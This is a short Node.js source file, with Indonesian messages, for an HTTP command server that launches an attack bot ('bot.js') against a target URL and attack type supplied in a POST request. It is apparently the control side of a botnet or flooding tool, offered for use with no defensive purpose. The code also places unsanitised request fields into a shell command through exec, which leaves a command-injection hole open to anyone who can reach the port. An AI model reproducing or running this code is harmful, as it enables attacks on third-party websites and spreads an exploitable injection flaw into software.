const http = require('http');
const { exec } = require('child_process');

const PORT = 3000;

http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/start') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            const { targetURL, attackType } = JSON.parse(body);
            exec(`TARGET_URL=${targetURL} ATTACK_TYPE=${attackType} node bot.js`, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Kesalahan exec: ${error}`);
                    return;
                }
                console.log(`Stdout: ${stdout}`);
                console.error(`Stderr: ${stderr}`);
            });
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Serangan dimulai pada bot\n');
        });
    } else if (req.method === 'POST' && req.url === '/stop') {
        // Implementasi perintah stop jika diperlukan
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Serangan dihentikan pada bot\n');
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Tidak Ditemukan\n');
    }
}).listen(PORT, () => {
    console.log(`Server perintah mendengarkan pada port ${PORT}`);
});
